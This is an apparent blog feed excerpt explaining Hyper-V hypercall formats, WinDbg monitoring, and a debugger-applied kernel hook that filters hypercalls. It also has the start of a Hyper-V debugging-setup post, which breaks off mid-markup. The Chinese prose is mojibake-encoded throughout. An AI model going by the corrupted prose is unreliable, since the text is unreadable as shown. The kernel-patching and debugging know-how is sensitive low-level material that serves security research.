    <content type="html"><![CDATA[<p>Hyper-V Hypercall ç›¸å…³åŸºç¡€çŸ¥è¯†ä»‹ç»ã€‚</p><a id="more"></a><h2 id="0x01-Hypercall-ä»‹ç»"><a href="#0x01-Hypercall-ä»‹ç»" class="headerlink" title="0x01. Hypercall ä»‹ç»"></a>0x01. Hypercall ä»‹ç»</h2><p>Hypercall ç”¨äºä»è™šæ‹Ÿæœºåˆ° Hypervisor çš„çŠ¶æ€åˆ‡æ¢ï¼Œå°±åƒ System Call ç”¨äºä»ç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„çŠ¶æ€åˆ‡æ¢ä¸€æ ·ã€‚</p><h3 id="1-1-Hypercall-Classes"><a href="#1-1-Hypercall-Classes" class="headerlink" title="1.1 Hypercall Classes"></a>1.1 Hypercall Classes</h3><p>Hypercall å¯ä»¥åˆ†ä¸ºä¸¤ç§ä¸åŒçš„ç±»å‹ï¼šç®€å•ç±»å‹ï¼ˆ<strong>Simple</strong>ï¼‰å’Œé‡å¤ç±»å‹ï¼ˆ<strong>Repeat / Rep</strong>ï¼‰ã€‚</p><ul><li>Simple Hypercall æ‹¥æœ‰å›ºå®šå¤§å°çš„è¾“å…¥å’Œè¾“å‡ºå‚æ•°ï¼Œæ‰§è¡Œä¸€ä¸ªå•ä¸€çš„æ“ä½œ</li><li>Repeat Hypercall å¯ä»¥çœ‹æˆæ˜¯ç”±ä¸€ç³»åˆ— Simple Hypercall ç»„æˆçš„</li></ul><p>åœ¨å‘èµ· Repeat Hypercall æ—¶ï¼Œè°ƒç”¨æ–¹éœ€è¦æŒ‡æ˜è¾“å…¥è¾“å‡ºå‚æ•°çš„ç»„æ•°ï¼ˆ<em>rep count</em>ï¼‰ï¼Œä»¥åŠå°†è¦è¢«å¤„ç†çš„è¾“å…¥è¾“å‡ºå‚æ•°çš„ç´¢å¼•æ•°ï¼ˆ<em>rep start index</em>ï¼‰ï¼›Hypervisor å°†æŒ‰ç…§é¡ºåºå¤„ç†å¯¹åº”çš„æ•°æ®ã€‚</p><h3 id="1-2-Hypercall-Continuation"><a href="#1-2-Hypercall-Continuation" class="headerlink" title="1.2 Hypercall Continuation"></a>1.2 Hypercall Continuation</h3><p>Hypervisor ä¼šé™åˆ¶ Hypercall çš„æ‰§è¡Œæ—¶é—´åœ¨ <code>50Î¼s</code> ä»¥å†…ï¼Œè¶…è¿‡è¯¥æ—¶é—´é™åˆ¶çš„ Hypercall ä¾èµ–äºä¸€ç§å«åš Hypercall Continuation çš„æœºåˆ¶æ¥å®Œæˆï¼Œè¯¥æœºåˆ¶å¯¹è°ƒç”¨æ–¹è€Œè¨€åŸºæœ¬æ˜¯é€æ˜çš„ã€‚</p><p>å¯¹äºæ— æ³•åœ¨ <code>50Î¼s</code> çš„æ—¶é—´é™åˆ¶å†…å®Œæˆçš„ Hypercallï¼Œå½“æ§åˆ¶æƒä» Hypervisor è¿”å›åˆ°è™šæ‹Ÿæœºä¹‹åï¼Œå¯¹åº”çš„ RIP å¯„å­˜å™¨çš„å€¼å¹¶ä¸ä¼šæ”¹å˜ï¼›å½“å¯¹åº”çš„çº¿ç¨‹å†æ¬¡è·å¾—æ‰§è¡Œæœºä¼šæ—¶ï¼ŒåŸæœ‰çš„ Hypercall ä¼šè¢«ç»§ç»­æ‰§è¡Œã€‚æ˜¾ç„¶ï¼Œåœ¨ Hypercall å®Œæˆæ‰§è¡Œçš„è¿‡ç¨‹ä¸­éœ€è¦ç»´æŠ¤ä¸€ä¸ªçŠ¶æ€ï¼Œç±»ä¼¼ Repeat Hypercall çš„æ‰§è¡Œä¸€æ ·ã€‚</p><h3 id="1-3-Hypercall-Atomicity-and-Ordering"><a href="#1-3-Hypercall-Atomicity-and-Ordering" class="headerlink" title="1.3 Hypercall Atomicity and Ordering"></a>1.3 Hypercall Atomicity and Ordering</h3><p>ä¸€èˆ¬æ¥è¯´ï¼ŒHypercall çš„æ‰§è¡Œæ˜¯åŸå­çš„ï¼šSimple Hypercall å°±æ˜¯å•ä¸ªçš„åŸå­æ“ä½œï¼ŒRepeat Hypercall åˆ™æ˜¯ä¸€ç³»åˆ—çš„åŸå­æ“ä½œï¼›å¯¹äºæ— æ³•ä¸€æ¬¡æ‰§è¡Œå®Œæ¯•çš„ Hypercallï¼ˆå³è¶…è¿‡ <code>50Î¼s</code> æ—¶é—´é™åˆ¶çš„ Hypercallï¼‰ï¼Œåˆ™ç”±å¤šä¸ªåŸå­æ“ä½œæ‰€ç»„æˆã€‚</p><h3 id="1-4-Hypercall-Inputs"><a href="#1-4-Hypercall-Inputs" class="headerlink" title="1.4 Hypercall Inputs"></a>1.4 Hypercall Inputs</h3><p>å¯¹äºä»»æ„çš„ Hypercallï¼Œå¿…ç„¶è‡³å°‘æœ‰ä¸€ä¸ªè¾“å…¥å‚æ•°ï¼Œå› ä¸ºè‚¯å®šéœ€è¦æŒ‡å®šä¸€ä¸ªç¼–å·ã€‚åœ¨ x64 ç¯å¢ƒä¸‹ï¼Œè¯¥å‚æ•°é€šè¿‡ <code>RCX</code> å¯„å­˜å™¨ä¼ é€’ï¼Œå¯¹åº”çš„æ•°æ®æ ¼å¼å¦‚ä¸‹ï¼š</p><p><img src="/uploads/202005/hypercall-input-rcx.png" alt="Hyper-v Hypercall RCX å‚æ•°æ ¼å¼"></p><p>å¯¹åº”çš„è¯´æ˜å¦‚ä¸‹ï¼š</p><table><thead><tr><th>å­—æ®µ</th><th>å®½åº¦</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>Call code</td><td>16 bits</td><td>Hypercall çš„ç¼–å·</td></tr><tr><td>Fast</td><td>1 bit</td><td>0 è¡¨ç¤ºåŸºäºå†…å­˜çš„è°ƒç”¨çº¦å®šï¼Œ1 è¡¨ç¤ºåŸºäºå¯„å­˜å™¨çš„è°ƒç”¨çº¦å®š</td></tr><tr><td>Variable header size</td><td>9 bits</td><td>Variable Headr çš„å¤§å°</td></tr><tr><td>RsvdZ</td><td>5 bits</td><td>å¿…é¡»æ˜¯ 0</td></tr><tr><td>Is Nested</td><td>1 bit</td><td>0 è¡¨ç¤ºç”± Guest Hypervisor å¤„ç†ï¼Œ1 è¡¨ç¤ºç”± L0 Hypervisor å¤„ç†</td></tr><tr><td>Rep Count</td><td>12 bits</td><td>Repeat Hypercall çš„é‡å¤æ¬¡æ•°ï¼ˆSimple Hypercall å¿…é¡»æ˜¯ 0ï¼‰</td></tr><tr><td>RsvdZ</td><td>4 bits</td><td>å¿…é¡»æ˜¯ 0</td></tr><tr><td>Rep Start Index</td><td>12 bits</td><td>Repeat Hypercall çš„ç´¢å¼•å€¼ï¼ˆSimple Hypercall å¿…é¡»æ˜¯ 0ï¼‰</td></tr><tr><td>RsvdZ</td><td>4 bits</td><td>å¿…é¡»æ˜¯ 0</td></tr></tbody></table><p>å¦‚æœ Fast çš„å€¼ä¸º 0ï¼Œé‚£ä¹ˆ <code>RDX</code> å¯„å­˜å™¨å¯ä»¥ç”¨äºä¼ é€’è¾“å…¥å‚æ•°çš„ GPAï¼ˆGuest Physical Addressï¼‰ï¼Œ<code>R8</code> å¯„å­˜å™¨å¯ä»¥ç”¨äºä¼ é€’è¾“å‡ºå‚æ•°çš„ GPAã€‚</p><p>å¦‚æœ Fast çš„å€¼ä¸º 1ï¼Œé‚£ä¹ˆ <code>RDX</code> å’Œ <code>R8</code> å¯„å­˜å™¨å¯ä»¥ç”¨äºä¼ é€’è¾“å…¥å‚æ•°ã€‚</p><p>å¦‚æœ Hypervisor æ”¯æŒ Extended Fast Hypercallsï¼Œé‚£ä¹ˆè¿˜å¯ä»¥ä½¿ç”¨ XMM å¯„å­˜å™¨æ¥ä¼ é€’è¾“å…¥å‚æ•°ï¼Œæœ€å¤šæ”¯æŒ <code>112</code> å­—èŠ‚çš„æ•°æ®ï¼šXMM0 ~ XMM5 å…± <code>16 * 6 = 96</code> å­—èŠ‚ï¼Œä»¥åŠ <code>RDX</code> å’Œ <code>R8</code> å…± <code>16</code> å­—èŠ‚ã€‚</p><h3 id="1-5-Hypercall-Outputs"><a href="#1-5-Hypercall-Outputs" class="headerlink" title="1.5 Hypercall Outputs"></a>1.5 Hypercall Outputs</h3><p>Hypercall çš„è¿”å›å€¼é€šè¿‡ <code>RAX</code> å¯„å­˜å™¨ä¼ é€’ï¼Œå¯¹åº”çš„æ•°æ®æ ¼å¼å¦‚ä¸‹ï¼š</p><p><img src="/uploads/202005/hypercall-output-rax.png" alt="Hyper-v Hypercall RAX å‚æ•°æ ¼å¼"></p><p>å¯¹åº”çš„è¯´æ˜å¦‚ä¸‹ï¼š</p><table><thead><tr><th>å­—æ®µ</th><th>å®½åº¦</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>Result</td><td>16 bits</td><td>HV_STATUS code</td></tr><tr><td>Rsvd</td><td>16 bits</td><td>ä¿ç•™å­—æ®µ</td></tr><tr><td>Reps completed</td><td>12 bits</td><td>å·²ç»æˆåŠŸæ‰§è¡Œçš„ Repeat æ•°</td></tr><tr><td>Rsvd</td><td>20 bits</td><td>ä¿ç•™å­—æ®µ</td></tr></tbody></table><p>æ³¨æ„è¿™é‡Œçš„ <code>Reps completed</code> æ˜¯é’ˆå¯¹æ•´ä¸ª Repeat Hypercall è€Œè¨€çš„ï¼Œå³æ•´ä¸ª Repeat Hypercall å·²ç»æˆåŠŸæ‰§è¡Œçš„ Repeat æ•°ã€‚</p><p>åŒæ ·ï¼Œè¾“å‡ºå‚æ•°ä¹Ÿæ”¯æŒä½¿ç”¨ XMM å¯„å­˜å™¨ä¼ é€’ã€‚</p><h2 id="0x02-Hypercall-è°ƒç”¨"><a href="#0x02-Hypercall-è°ƒç”¨" class="headerlink" title="0x02. Hypercall è°ƒç”¨"></a>0x02. Hypercall è°ƒç”¨</h2><p>Windows å†…æ ¸æ¨¡å—å¯¼å‡ºäº†ä¸€ä¸ªå‡½æ•° <code>HvlInvokeHypercall</code> å¯ä»¥ç”¨äºå‘èµ· Hypercallï¼Œè¯¥å‡½æ•°æ˜¯å¯¹ <code>vmcall</code> / <code>vmmcall</code> æŒ‡ä»¤çš„ä¸€ä¸ªåŒ…è£…ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; u poi(nt!HvcallCodeVa)</span><br><span class="line">fffff804`3f330000 0f01d9          vmmcall</span><br><span class="line">fffff804`3f330003 c3              ret</span><br><span class="line"></span><br><span class="line">1: kd&gt; u nt!HvcallInitiateHypercall</span><br><span class="line">nt!HvcallInitiateHypercall:</span><br><span class="line">fffff804`40945080 4883ec28        sub     rsp,28h</span><br><span class="line">fffff804`40945084 488b059de22200  mov     rax,qword ptr [nt!HvcallCodeVa]</span><br><span class="line">fffff804`4094508b e850f20000      call    nt!_guard_retpoline_indirect_rax</span><br><span class="line">fffff804`40945090 4883c428        add     rsp,28h</span><br><span class="line">fffff804`40945094 c3              ret</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œå‡½æ•°çš„è°ƒå¼ç¬¦å·ä¸º <code>HvcallInitiateHypercall</code> ï¼Œåªä¸è¿‡æ˜¯ä»¥ <code>HvlInvokeHypercall</code> çš„åä¹‰å¯¼å‡ºçš„ã€‚</p><h2 id="0x03-Hypercall-ç›‘æ§"><a href="#0x03-Hypercall-ç›‘æ§" class="headerlink" title="0x03. Hypercall ç›‘æ§"></a>0x03. Hypercall ç›‘æ§</h2><p>åœ¨ WinDbg ä¸­ï¼Œå¯ä»¥é€šè¿‡å¯¹ <code>poi(nt!HvcallCodeVa)</code> ä¸‹ç¡¬ä»¶æ‰§è¡Œæ–­ç‚¹æ¥ç›‘æ§ Hypercall çš„è°ƒç”¨ï¼Œæ‹†åˆ†åçš„ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ba e1 poi(nt!HvcallCodeVa)</span><br><span class="line"></span><br><span class="line">.printf &quot;           Hypercall: 0x%X\n&quot;, rcx &amp; 0xFFFF</span><br><span class="line">.printf &quot;                Fast: 0x%X\n&quot;, (rcx &gt;&gt; 16) &amp; 1</span><br><span class="line">.printf &quot;Variable header size: 0x%X\n&quot;, (rcx &gt;&gt; 17) &amp; 0x1FF</span><br><span class="line">.printf &quot;           Is Nested: 0x%X\n&quot;, (rcx &gt;&gt; 26) &amp; 1</span><br><span class="line">.printf &quot;           Rep Count: 0x%X\n&quot;, (rcx &gt;&gt; 32) &amp; 0xFFF</span><br><span class="line">.printf &quot;     Rep Start Index: 0x%X\n&quot;, (rcx &gt;&gt; 48) &amp; 0xFFF</span><br><span class="line">k</span><br><span class="line">g</span><br></pre></td></tr></table></figure><p>WinDbg ä»…æ”¯æŒå•è¡Œå‘½ä»¤ï¼Œæ‰€ä»¥å®é™…æµ‹è¯•æ—¶éœ€è¦æŠŠæ–­ç‚¹ä¹‹åçš„å‘½ä»¤å†™æˆä¸€è¡Œã€ä½¿ç”¨åŒå¼•å·æ‹¬èµ·æ¥å¹¶ä¸”åŸæœ‰å‘½ä»¤ä¸­çš„ç‰¹æ®Šå­—ç¬¦éœ€è¦è¿›è¡Œè½¬ä¹‰å¤„ç†ã€‚</p><p>ä½¿ç”¨ä¸Šé¢çš„æ–¹æ³•è¿›è¡Œç›‘æ§ï¼ŒWinDbg ä¼šè¾“å‡ºå¤§é‡çš„æ—¥å¿—ï¼Œè¿™å…¶ä¸­ä¸ä¹ä¸€äº›å¥‡æ€ªçš„æ—¥å¿—ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">           Hypercall: 0xB</span><br><span class="line">                Fast: 0x0</span><br><span class="line">Variable header size: 0x0</span><br><span class="line">           Is Nested: 0x0</span><br><span class="line">           Rep Count: 0x0</span><br><span class="line">     Rep Start Index: 0x100</span><br><span class="line"> # Child-SP          RetAddr           Call Site</span><br><span class="line">00 fffffd89`ba061828 fffff800`37c89f7c 0xfffff800`35e10000</span><br><span class="line">01 fffffd89`ba061830 fffff800`384b9752 nt!HvlSendSyntheticClusterIpi+0x7c</span><br><span class="line">02 fffffd89`ba061860 fffff800`37abaecb hal!HalRequestIpi+0x532</span><br><span class="line">03 fffffd89`ba061b00 fffff800`37bc5e84 nt!PoIdle+0x45b</span><br><span class="line">04 fffffd89`ba061c60 00000000`00000000 nt!KiIdleLoop+0x44</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚ï¼ŒæŒ‰ç…§å¾®è½¯å®˜æ–¹æ–‡æ¡£çš„ç†è§£ï¼Œè¿™é‡Œ <code>Rep Count</code> ä¸º <code>0</code> ï¼Œæ‰€ä»¥ç¼–å·ä¸º <code>0xB</code> çš„ Hypercall åº”è¯¥æ˜¯ä¸€ä¸ª Simple Hypercallï¼Œè€Œ Simple Hypercall çš„ <code>Rep Start Index</code> ä¹Ÿåº”è¯¥æ˜¯ <code>0</code> ï¼Œä½†è¿™é‡Œå´ä¸º <code>0x100</code> ã€‚</p><p>å½“ç„¶ï¼Œè¿™ç§æ–¹æ³•æœ€ä¸»è¦çš„é—®é¢˜æ˜¯æ²¡æœ‰å¯¹ Hypercall è¿›è¡Œè¿‡æ»¤ï¼Œè¿™å°±ä¼šå¯¼è‡´ WinDbg éœ€è¦é¢‘ç¹åœ°å¤„ç†æ–­ç‚¹ï¼Œæ—¢è€—è´¹èµ„æºï¼Œæ“ä½œä¹Ÿä¸æ˜¯å¾ˆæ–¹ä¾¿ã€‚é‚£ä¹ˆåœ¨ WinDbg çš„æ¡ä»¶æ–­ç‚¹ä¸­å†åŠ ä¸€ä¸ªè¿‡æ»¤æ¡ä»¶å¯ä¸å¯ä»¥å‘¢ï¼Ÿå½“ç„¶æ˜¯å¯ä»¥çš„ï¼ä½†æ˜¯åœ¨ WinDbg è¿›è¡Œè¿‡æ»¤çš„æ—¶å€™ï¼Œå…¶å®æ–­ç‚¹å·²ç»å‘½ä¸­å¹¶ä¸”ç”± WinDbg æ¥ç®¡äº†ï¼Œæ‰€ä»¥ååº”é€Ÿåº¦è¿˜æ˜¯å¾ˆæ…¢ã€‚</p><p>Jaanus KaÌˆaÌˆp é€šè¿‡åœ¨ WinDbg ä¸­å¯¹å†…æ ¸æ¨¡å—è¿›è¡Œ Patchï¼Œå³å¯¹åœ°å€ <code>poi(nt!HvcallCodeVa)</code> è¿›è¡Œ HOOKï¼Œç›´æ¥è¿‡æ»¤æ‰ä¸æ„Ÿå…´è¶£çš„ Hypercallï¼Œè¿™æ · WinDbg çš„ååº”é€Ÿåº¦å°±ä¼šå¿«å¾ˆå¤šã€‚å…·ä½“çš„æ“ä½œæ–¹æ³•å¦‚ä¸‹ï¼š</p><ol><li>å†™ä¸€æ®µæ±‡ç¼–æŒ‡ä»¤è¿‡æ»¤æ‰ Fast ç±»å‹çš„ Hypercall</li><li>å°†æ±‡ç¼–æŒ‡ä»¤ç¼–è¯‘æˆæœºå™¨ç </li><li>åœ¨å†…æ ¸æ¨¡å—çš„ <code>.text</code> æœ«å°¾æ‰¾åˆ°ä¸€å—å¯æ‰§è¡Œçš„ç©ºç™½åŒºé—´ç”¨äºå­˜æ”¾æœºå™¨ç </li><li>ä¿®å¤ HOOK çš„è·³è½¬<ul><li>æŠŠ <code>nt!HvcallCodeVa</code> å¤„çš„å€¼ä¿®æ”¹ä¸ºä¸Šè¿°æœºå™¨ç çš„èµ·å§‹åœ°å€</li><li>è¿‡æ»¤ä»£ç æ‰§è¡Œå®Œæ¯•åè·³è½¬å› <code>poi(nt!HvcallCodeVa)</code> æ‰§è¡Œä»£ç </li></ul></li></ol><p>è¿‡æ»¤ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">        test    rcx, 0x10000</span><br><span class="line">        jnz     skip</span><br><span class="line">        int     3</span><br><span class="line">skip:</span><br><span class="line">        mov     rax, 0xfffff8014dfc0000</span><br><span class="line">        jmp     rax</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¦‚æœé‡åˆ°é Fast Hypercall åˆ™é€šè¿‡ <code>int 3</code> ä¸­æ–­ï¼Œä¼šè‡ªåŠ¨æ¿€æ´» WinDbgï¼›ä¹Ÿå¯ä»¥åœ¨è¿™é‡Œä¸‹æ¡ä»¶æ–­ç‚¹è¿›è¡Œè‡ªåŠ¨ç›‘æ§ã€‚</p><h2 id="0x04-å‚è€ƒæ–‡æ¡£"><a href="#0x04-å‚è€ƒæ–‡æ¡£" class="headerlink" title="0x04. å‚è€ƒæ–‡æ¡£"></a>0x04. å‚è€ƒæ–‡æ¡£</h2><ol><li>Jaanus KaÌˆaÌˆp åšå®¢ <a href="https://foxhex0ne.blogspot.com/2020/05/hyper-v-0x1-hypercalls-part-1.html" target="_blank" rel="noopener">Hyper-V #0x1 - Hypercalls part 1</a></li><li>å¾®è½¯å®˜æ–¹æ–‡æ¡£ <a href="https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/reference/tlfs" target="_blank" rel="noopener">Hypervisor Top-Level Functional Specification</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Hyper-V Hypercall ç›¸å…³åŸºç¡€çŸ¥è¯†ä»‹ç»ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="http://programlife.net/categories/Virtualization/"/>
    
      <category term="Hyper-V" scheme="http://programlife.net/categories/Virtualization/Hyper-V/"/>
    
    
      <category term="Hyper-V" scheme="http://programlife.net/tags/Hyper-V/"/>
    
      <category term="Hypercall" scheme="http://programlife.net/tags/Hypercall/"/>
    
  </entry>
  
  <entry>
    <title>Hyper-V è°ƒè¯•ç¯å¢ƒæ­å»º</title>
    <link href="http://programlife.net/2020/05/16/hyper-v-debugging/"/>
    <id>http://programlife.net/2020/05/16/hyper-v-debugging/</id>
    <published>2020-05-16T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡å°†è¯¦ç»†ä»‹ç»ä½¿ç”¨ AMD CPU çš„ç”µè„‘å¦‚ä½•åˆ©ç”¨ VMware Workstation æ­å»º Hyper-V çš„è°ƒè¯•ç¯å¢ƒã€‚</p><a id="more"></a><p>ä¸Šä¸€ç¯‡æ–‡ç« ã€Š<a href="https://programlife.net/2020/05/11/hyper-v-on-windows-10-notes/">Hyper-V on Windows 10 Notes</a>ã€‹æåˆ°äº† Hyper-V æš‚æ—¶ä¸æ”¯æŒ AMD CPU çš„åµŒå¥—è™šæ‹ŸåŒ–ï¼Œæ‰€ä»¥å°±æ— æ³•ä½¿ç”¨æ–‡ç« ã€Š<a href="https://msrc-blog.microsoft.com/2018/12/10/first-steps-in-hyper-v-research/" target="_blank" rel="noopener">First Steps in Hyper-V Research</a>ã€‹ä¸­ä»‹ç»çš„ Hyper-V åµŒå¥—è™šæ‹ŸåŒ–æ¥æ­å»º Hyper-V çš„è°ƒè¯•ç¯å¢ƒï¼Œæœ¬æ–‡å‚è€ƒæ–‡ç« ã€Š<a href="https://foxhex0ne.blogspot.com/2020/05/hyper-v-0x0-research-setup.html" target="_blank" rel="noopener">Hyper-V #0x0 - Research setup</a>ã€‹ä¸­ä»‹ç»çš„æ–¹æ³•åˆ©ç”¨ VMware Workstation æ¥æ­å»º Hyper-V çš„è°ƒè¯•ç¯å¢ƒã€‚</p><h2 id="0x01-ç‰©ç†æœºè®¾ç½®"><a href="#0x01-ç‰©ç†æœºè®¾ç½®" class="headerlink" title="0x01. ç‰©ç†æœºè®¾ç½®"></a>0x01. ç‰©ç†æœºè®¾ç½®</h2><p>ç‰©ç†æœºä¸éœ€è¦å®‰è£… Hyper-V ç»„ä»¶ï¼Œå¦åˆ™ VMware Workstation å°†æ— æ³•è¿è¡Œï¼›å¦‚æœç‰©ç†æœºå®‰è£…äº† Hyper-Vï¼Œå¯ä»¥å‚è€ƒæ–‡ç« ã€Š<a href="https://programlife.net/2020/05/10/vmware-workstation-incompatible-with-device-credential-guard/">VMware Workstation Incompatible with Device/Credential Guard</a>ã€‹ä¸´æ—¶ç¦ç”¨ Hyper-Vã€‚</p><h2 id="0x02-è™šæ‹Ÿæœºè®¾ç½®"><a href="#0x02-è™šæ‹Ÿæœºè®¾ç½®" class="headerlink" title="0x02. è™šæ‹Ÿæœºè®¾ç½®"></a>0x02. è™šæ‹Ÿæœºè®¾ç½®</h2><p>ç‰©ç†æœºå®‰è£…å¥½ VMware Workstation ä¹‹åï¼Œå¯ä»¥æ–°å»ºä¸€ä¸ªè™šæ‹Ÿæœºå¹¶å®‰è£…å¥½æœ€æ–°çš„ 64 ä½ Windows 10 æ“ä½œç³»ç»Ÿã€‚</p><h3 id="2-1-è™šæ‹Ÿæœº-CPU-è®¾ç½®"><a href="#2-1-è™šæ‹Ÿæœº-CPU-è®¾ç½®" class="headerlink" title="2.1 è™šæ‹Ÿæœº CPU è®¾ç½®"></a>2.1 è™šæ‹Ÿæœº CPU è®¾ç½®</h3><p>è¿™é‡Œéœ€è¦åœ¨ VMware Workstation ä¸­ä¸ºè™šæ‹Ÿæœºçš„ CPU å¼€å¯è™šæ‹ŸåŒ–å¼•æ“ï¼š</p><ul><li>è™šæ‹ŸåŒ– Intel VT-x/EPT æˆ– AMD-V/RVI(V)</li><li>è™šæ‹ŸåŒ– CPU æ€§èƒ½è®¡æ•°å™¨(U)</li></ul><p><img src="/uploads/202005/vmware-hyperv-cpu-settings.png" alt="CPU è™šæ‹ŸåŒ–å¼•æ“è®¾ç½®"></p><p>åŒæ—¶ï¼Œéœ€è¦ä¸ºè™šæ‹Ÿæœºå¢åŠ ä¸€ä¸ªä¸²å£ç”¨äº Windows å†…æ ¸è°ƒè¯•ï¼ˆè™šæ‹Ÿæœºé»˜è®¤æœ‰ä¸€ä¸ªæ‰“å°æœºï¼Œéœ€è¦å…ˆæŠŠæ‰“å°æœºåˆ æ‰ï¼‰ï¼š</p><ul><li>ä½¿ç”¨å‘½åç®¡é“ <code>\\.\pipe\com_1</code> </li><li>è¯¥ç«¯æ˜¯æœåŠ¡å™¨</li><li>å¦ä¸€ç«¯æ˜¯è™šæ‹Ÿæœº</li></ul><p><img src="/uploads/202005/vmware-kernel-debug-serial-port.png" alt="è™šæ‹Ÿæœºä¸²å£è®¾ç½®"></p><h3 id="2-2-è™šæ‹Ÿæœº-Hyper-V-è®¾ç½®"><a href="#2-2-è™šæ‹Ÿæœº-Hyper-V-è®¾ç½®" class="headerlink" title="2.2 è™šæ‹Ÿæœº Hyper-V è®¾ç½®"></a>2.2 è™šæ‹Ÿæœº Hyper-V è®¾ç½®</h3><p>è¿™é‡Œéœ€è¦åœ¨å®‰è£…å¥½çš„è™šæ‹Ÿæœºä¸­å®‰è£…å¹¶å¯ç”¨ Hyper-V ç»„ä»¶ï¼ŒåŒæ—¶é€šè¿‡ <code>bcdedit</code> è®¾ç½®ç›¸å…³çš„è°ƒè¯•é€‰é¡¹ã€‚</p><ul><li>å†…æ ¸è°ƒè¯•è®¾ç½®ï¼ˆé€šè¿‡ä¸²å£è¿›è¡Œè°ƒè¯•ï¼‰</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /dbgsettings serial debugport:<span class="number">1</span> baudrate:<span class="number">115200</span></span><br><span class="line">bcdedit /debug on</span><br></pre></td></tr></table></figure><ul><li>Hyper-V è°ƒè¯•è®¾ç½®ï¼ˆé€šè¿‡ç½‘ç»œè¿›è¡Œè°ƒè¯•ï¼‰</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /hypervisorsettings NET HOSTIP:<span class="number">192.168</span>.<span class="number">6.1</span> PORT:<span class="number">50000</span></span><br><span class="line">bcdedit /set hypervisordebug on</span><br><span class="line">bcdedit /set hypervisorlaunchtype auto</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œçš„ IP åœ°å€æ˜¯ç‰©ç†æœºä¸­ç½‘å¡ <code>VMware Network Adapter VMnet8</code> çš„ IP åœ°å€ï¼Œç«¯å£è®¾ç½®ä¸º <code>50000</code> ã€‚è¿™æ¡å‘½ä»¤æ‰§è¡Œå®Œæ¯•ä¹‹åäº§ç”Ÿçš„ä¸€ä¸ª Key éœ€è¦è®°ä¸‹æ¥ï¼Œåé¢ WinDbg è®¾ç½®å°†ä¼šç”¨åˆ°ã€‚</p><p><img src="/uploads/202005/hyperv-bcdedit-debug-settings.png" alt="è™šæ‹Ÿæœº Hyper-V è®¾ç½®"></p><h2 id="0x03-WinDbg-è®¾ç½®"><a href="#0x03-WinDbg-è®¾ç½®" class="headerlink" title="0x03. WinDbg è®¾ç½®"></a>0x03. WinDbg è®¾ç½®</h2><p>å¤åˆ¶ä¸¤ä¸ª 64 ä½ WinDbg çš„å¿«æ·æ–¹å¼ï¼Œå…¶ä¸­ä¸€ä¸ªé™„åŠ å¦‚ä¸‹å‚æ•°ç”¨äºè°ƒè¯• Windows å†…æ ¸ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-k com:port=\\.\pipe\com_1,baud=115200,pipe,reconnect</span><br></pre></td></tr></table></figure><p>å¦ä¸€ä¸ªé™„åŠ å¦‚ä¸‹å‚æ•°ç”¨äºè°ƒè¯• Hyper-Vï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-k net:port=50000,key=å‰é¢ç”Ÿæˆçš„Keyå­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure><h2 id="0x04-Hyper-V-è°ƒè¯•"><a href="#0x04-Hyper-V-è°ƒè¯•" class="headerlink" title="0x04. Hyper-V è°ƒè¯•"></a>0x04. Hyper-V è°ƒè¯•</h2><p>ä¸€åˆ‡å‡†å¤‡å°±ç»ªä¹‹åï¼Œå…ˆæ‰“å¼€ä¸¤ä¸ª WinDbgï¼Œç„¶åå¼€å¯è™šæ‹Ÿæœºï¼Œå°±å¯ä»¥å¼€å§‹è°ƒè¯•äº†ã€‚</p><p>åœ¨è°ƒè¯• Hyper-V çš„ WinDbg ä¸­ï¼Œå¯ä»¥æŸ¥çœ‹ <code>hv</code> æ¨¡å—çš„ç›¸å…³ä¿¡æ¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 